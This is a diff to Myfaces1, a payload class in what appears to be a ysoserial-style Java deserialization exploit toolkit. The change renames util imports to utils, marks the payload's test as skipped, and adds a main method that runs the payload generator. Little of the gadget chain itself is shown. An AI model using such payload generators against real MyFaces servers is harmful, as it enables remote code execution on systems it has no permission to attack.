@@ -8,6 +8,8 @@ import javax.servlet.ServletContext;
 import javax.servlet.ServletRequest;
 import javax.servlet.ServletResponse;
 
+import A.R.ysogate.payloads.annotation.PayloadTest;
+import A.R.ysogate.payloads.utils.PayloadRunner;
 import org.apache.myfaces.context.servlet.FacesContextImpl;
 import org.apache.myfaces.context.servlet.FacesContextImplBase;
 import org.apache.myfaces.el.CompositeELResolver;
@@ -18,8 +20,8 @@ import A.R.ysogate.payloads.DynamicDependencies;
 import A.R.ysogate.payloads.ObjectPayload;
 import A.R.ysogate.payloads.annotation.Authors;
 import A.R.ysogate.payloads.annotation.Dependencies;
-import A.R.ysogate.payloads.util.Gadgets;
-import A.R.ysogate.payloads.util.Reflections;
+import A.R.ysogate.payloads.utils.Gadgets;
+import A.R.ysogate.payloads.utils.Reflections;
 
 
 /**
@@ -39,6 +41,7 @@ import A.R.ysogate.payloads.util.Reflections;
  *
  * @author mbechler
  */
+@PayloadTest(skip="Requires running MyFaces, no direct execution")
 @Dependencies
 @Authors({Authors.MBECHLER})
 public class Myfaces1 implements ObjectPayload<Object>, DynamicDependencies {
@@ -84,5 +87,9 @@ public class Myfaces1 implements ObjectPayload<Object>, DynamicDependencies {
 		ValueExpressionMethodExpression e2  = new ValueExpressionMethodExpression(ve2);
 
 		return Gadgets.makeMap(e2, e);
+	}
+
+	public static void main ( final String[] args ) throws Exception {
+		PayloadRunner.run(Myfaces1.class, args);
 	}
 }
